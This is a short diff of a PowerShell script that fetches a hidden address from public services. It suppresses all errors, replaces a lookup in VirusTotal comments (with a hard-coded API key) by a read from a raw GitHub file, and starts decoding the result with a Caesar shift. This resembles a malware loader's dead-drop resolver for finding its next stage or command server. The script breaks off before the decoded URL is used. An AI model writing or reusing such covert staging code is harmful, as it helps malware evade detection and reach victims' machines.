@@ -1,9 +1,6 @@
 $ErrorActionPreference= 'silentlycontinue'
-$headers=@{}
-$headers.Add("accept", "application/json")
-$response = Invoke-WebRequest -Uri 'https://www.virustotal.com/vtapi/v2/comments/get?apikey=d4a0ac345e9d92ae91a292780f1e35cd29f609db951968681c81ef29063dd966&resource=5171e1e09d4d1173f3ff163c18e28144f667fa8609984565efad9bd9f999818d' -Method GET -Headers $headers
-$data=$response.Content | ConvertFrom-Json
-$url=$data.comments.comment
+$response = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/adaptive100200300/api/refs/heads/main/address' -Method GET 
+$url=$response.Content
 
 $shift = 3
 $deobfuscatedUrl = ""
